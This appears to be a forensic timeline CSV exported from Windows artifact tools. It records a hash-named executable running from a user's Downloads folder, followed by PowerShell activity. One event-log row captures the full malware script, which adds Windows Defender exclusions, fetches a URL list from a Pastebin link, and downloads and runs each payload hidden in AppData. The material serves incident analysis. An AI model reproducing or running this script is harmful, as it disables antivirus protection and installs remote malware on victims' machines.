DateTime,TimestampInfo,ArtifactName,Tool,Description,DataDetails,DataPath,FileExtension,EventId,User,Computer,FileSize,IPAddress,SourceAddress,DestinationAddress,SHA1,Count,EvidencePath,RawData
2025-05-02T00:00:02.0000000,Duration,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:19.0000000,Last Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:19.0000000,Client Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:22.0000000,Start Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:24.0000000,End Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-02T00:00:02.0000000,Duration,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:24.0000000,Last Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:24.0000000,Client Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,InFocus,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:25.0000000,Start Time,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,ExecuteOpen,System32/WindowsPowerShell/v1.0/powershell.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:25.0000000,Last Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,ExecuteOpen,System32/WindowsPowerShell/v1.0/powershell.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:25.0000000,Client Modified,WindowsTimelineActivity,EZ Tools,Windows Activity Timeline,ExecuteOpen,System32/WindowsPowerShell/v1.0/powershell.exe,,,,,,,,,,,FileFolderAccess/20250502233821_admin0x_Activity.csv,
2025-05-03T04:01:26.1735938,Last Write,Amcache,EZ Tools,Program Execution,Unassociated,c:/users/admin0x/downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,.exe,,,,36352,,,,c5efefddfd4d83486f58e18edb7d4139e13b9e0c,,ProgramExecution/20250502233755_Amcache_UnassociatedFileEntries.csv,
2025-05-03T03:47:03.0172243,Last Write,Amcache,EZ Tools,Program Execution,Unassociated,c:/windows/system32/devicecensus.exe,.exe,,,,58704,,,,4817d7039b5b983b6c115fa6a6f16a71fe59fafd,,ProgramExecution/20250502233755_Amcache_UnassociatedFileEntries.csv,
2025-05-03T04:36:03.6835142,Last Write,Amcache,EZ Tools,Program Execution,Unassociated,,,,,,,,,,,,ProgramExecution/20250502233755_Amcache_UnassociatedFileEntries.csv,
2025-05-03T04:00:59.5143829,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: # Start a hidden PowerShell process to display a message box, Start-Process powershell -WindowStyle Hidden -ArgumentList @', Add-Type -AssemblyName System.Windows.Forms;, [System.Windows.Forms.MessageBox]::Show('', '', 'OK', 'Error');, '@, # Add exclusions to Windows Defender, Add-MpPreference -ExclusionPath @($env:UserProfile, $env:SystemDrive) -Force, # Download files from a Pastebin URL and execute them, $wc = New-Object System.Net.WebClient, $lnk = $wc.DownloadString('https://pastebin.com/raw/RhwXFFwF') -split '`r`n', # Generate a random file name prefix, $fn = [System.IO.Path]::GetRandomFileName(), # Download and execute each file, for ($i = 0; $i -lt $lnk.Length; $i++) {,     $filePath = Join-Path -Path $env:AppData -ChildPath ($fn + $i.ToString() + '.exe'),     $wc.DownloadFile($lnk[$i], $filePath),     Start-Process -FilePath $filePath, }",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:01.8203298,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: , #requires -version 3.0, try { Microsoft.PowerShell.Core/Set-StrictMode -Off } catch { }, $script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module, $script:ClassName = 'ROOT/Microsoft/Windows/Defender/MSFT_MpComputerStatus', $script:ClassVersion = '', $script:ModuleVersion = '1.0', $script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter], $script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new(), Microsoft.PowerShell.Core/Export-ModuleMember -Function @(),         , function __cmdletization_BindCommonParameters, {,     param(,         $__cmdletization_objectModelWrapper,,         $myPSBoundParameters,     )       ,                 ,         if ($myPSBoundParameters.ContainsKey('CimSession')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('AsJob')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] ,         },                     , },                 , function Get-MpComputerStatus, {,     [CmdletBinding(DefaultParameterSetName='DefaultSet', PositionalBinding=$false)],     ,     [OutputType([Microsoft.Management.Infrastructure.CimInstance])], [OutputType('Microsoft.Management.Infrastructure.CimInstance#ROOT/Microsoft/Windows/Defender/MSFT_MpComputerStatus')],     param(,     ,     [Alias('Session')],     [ValidateNotNullOrEmpty()],     [CimSession[]],     ${CimSession},,     [int],     ${ThrottleLimit},,     [switch],     ${AsJob}),     DynamicParam {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new(),                 $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData),                 if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters]),                 {,                     ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters(),                 },             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },     Begin {,         $__cmdletization_exceptionHasBeenThrown = $false,         try ,         {,             __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters,             $__cmdletization_objectModelWrapper.BeginProcessing(),         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     Process {,         try ,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,     $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder(),     $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder),             },         },         catch,         {,             $__cmdletization_exceptionHasBeenThrown = $true,             throw,         },     },         ,     End {,         try,         {,             if (-not $__cmdletization_exceptionHasBeenThrown),             {,                 $__cmdletization_objectModelWrapper.EndProcessing(),             },         },         catch,         {,             throw,         },     },     # .EXTERNALHELP MSFT_MpComputerStatus.cdxml-Help.xml, }, Microsoft.PowerShell.Core/Export-ModuleMember -Function 'Get-MpComputerStatus' -Alias '*',         ,",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
2025-05-03T04:01:02.0546381,Event Time,Event Logs,EZ Tools,Contains contents of scripts run,Microsoft-Windows-PowerShell/Operational,"Channel: Microsoft-Windows-PowerShell/Operational | Computer: DESKTOP-704R550 | Path:  | ScriptBlockText: , #requires -version 3.0, try { Microsoft.PowerShell.Core/Set-StrictMode -Off } catch { }, $script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module, $script:ClassName = 'root/Microsoft/Windows/Defender/MSFT_MpPreference', $script:ClassVersion = '1.0', $script:ModuleVersion = '1.0', $script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter], $script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new(), Microsoft.PowerShell.Core/Export-ModuleMember -Function @(),         , function __cmdletization_BindCommonParameters, {,     param(,         $__cmdletization_objectModelWrapper,,         $myPSBoundParameters,     )       ,                 ,         if ($myPSBoundParameters.ContainsKey('CimSession')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] ,         },                     ,         if ($myPSBoundParameters.ContainsKey('AsJob')) { ,             $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] ,         },                     , },                 , function Set-MpPreference, {,     [CmdletBinding(PositionalBinding=$false)],     ,     ,     param(,     ,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${ExclusionPath},,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${ExclusionExtension},,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string[]],     ${ExclusionProcess},,     [Parameter(ParameterSetName='Set0')],     [Alias('rtsd')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('Both','Incoming','Outcoming')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanDirection],     ${RealTimeScanDirection},,     [Parameter(ParameterSetName='Set0')],     [Alias('qpiad')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [uint32],     ${QuarantinePurgeItemsAfterDelay},,     [Parameter(ParameterSetName='Set0')],     [Alias('rsd')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day],     ${RemediationScheduleDay},,     [Parameter(ParameterSetName='Set0')],     [Alias('rst')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [datetime],     ${RemediationScheduleTime},,     [Parameter(ParameterSetName='Set0')],     [Alias('raat')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [uint32],     ${ReportingAdditionalActionTimeOut},,     [Parameter(ParameterSetName='Set0')],     [Alias('rcto')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [uint32],     ${ReportingCriticalFailureTimeOut},,     [Parameter(ParameterSetName='Set0')],     [Alias('rncto')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [uint32],     ${ReportingNonCriticalTimeOut},,     [Parameter(ParameterSetName='Set0')],     [Alias('saclf')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [byte],     ${ScanAvgCPULoadFactor},,     [Parameter(ParameterSetName='Set0')],     [Alias('csbr')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${CheckForSignaturesBeforeRunningScan},,     [Parameter(ParameterSetName='Set0')],     [Alias('spiad')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [uint32],     ${ScanPurgeItemsAfterDelay},,     [Parameter(ParameterSetName='Set0')],     [Alias('soiie')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${ScanOnlyIfIdleEnabled},,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('QuickScan','FullScan')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ScanType],     ${ScanParameters},,     [Parameter(ParameterSetName='Set0')],     [Alias('scsd')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day],     ${ScanScheduleDay},,     [Parameter(ParameterSetName='Set0')],     [Alias('scsqst')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [datetime],     ${ScanScheduleQuickScanTime},,     [Parameter(ParameterSetName='Set0')],     [Alias('scst')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [datetime],     ${ScanScheduleTime},,     [Parameter(ParameterSetName='Set0')],     [Alias('sigfagp')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [uint32],     ${SignatureFirstAuGracePeriod},,     [Parameter(ParameterSetName='Set0')],     [Alias('sigagp')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [uint32],     ${SignatureAuGracePeriod},,     [Parameter(ParameterSetName='Set0')],     [Alias('sigdufss')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string],     ${SignatureDefinitionUpdateFileSharesSources},,     [Parameter(ParameterSetName='Set0')],     [Alias('sigduoswo')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${SignatureDisableUpdateOnStartupWithoutEngine},,     [Parameter(ParameterSetName='Set0')],     [Alias('sfo')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string],     ${SignatureFallbackOrder},,     [Parameter(ParameterSetName='Set0')],     [Alias('ssp','SecurityIntelligenceLocation','ssl')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [string],     ${SharedSignaturesPath},,     [Parameter(ParameterSetName='Set0')],     [Alias('sigsd')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('Everyday','Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday','Never')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day],     ${SignatureScheduleDay},,     [Parameter(ParameterSetName='Set0')],     [Alias('sigst')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [datetime],     ${SignatureScheduleTime},,     [Parameter(ParameterSetName='Set0')],     [Alias('siguci')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [uint32],     ${SignatureUpdateCatchupInterval},,     [Parameter(ParameterSetName='Set0')],     [Alias('sigui')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [uint32],     ${SignatureUpdateInterval},,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('Disabled','Basic','Advanced')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.MAPSReportingType],     ${MAPSReporting},,     [Parameter(ParameterSetName='Set0')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [ValidateSet('AlwaysPrompt','SendSafeSamples','NeverSend','SendAllSamples')],     [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.SubmitSamplesConsentType],     ${SubmitSamplesConsent},,     [Parameter(ParameterSetName='Set0')],     [Alias('dae')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableAutoExclusions},,     [Parameter(ParameterSetName='Set0')],     [Alias('dpm')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisablePrivacyMode},,     [Parameter(ParameterSetName='Set0')],     [Alias('rstt')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${RandomizeScheduleTaskTimes},,     [Parameter(ParameterSetName='Set0')],     [Alias('dbm')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableBehaviorMonitoring},,     [Parameter(ParameterSetName='Set0')],     [Alias('dips')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableIntrusionPreventionSystem},,     [Parameter(ParameterSetName='Set0')],     [Alias('dioavp')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableIOAVProtection},,     [Parameter(ParameterSetName='Set0')],     [Alias('drtm')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableRealtimeMonitoring},,     [Parameter(ParameterSetName='Set0')],     [Alias('dscrptsc')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableScriptScanning},,     [Parameter(ParameterSetName='Set0')],     [Alias('darchsc')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableArchiveScanning},,     [Parameter(ParameterSetName='Set0')],     [Alias('dcfsc')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableCatchupFullScan},,     [Parameter(ParameterSetName='Set0')],     [Alias('dcqsc')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableCatchupQuickScan},,     [Parameter(ParameterSetName='Set0')],     [Alias('demsc')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableEmailScanning},,     [Parameter(ParameterSetName='Set0')],     [Alias('drdsc')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableRemovableDriveScanning},,     [Parameter(ParameterSetName='Set0')],     [Alias('drp')],     [ValidateNotNull()],     [ValidateNotNullOrEmpty()],     [bool],     ${DisableRestorePoint},,     [Parameter(ParameterSetName='Set0')],     [Alias('dsmndfsc')],     [ValidateNotNul...[truncated]",,4104,,DESKTOP-704R550,,,,,,,EventLogs/20250503043822_EvtxECmd_Output.csv,
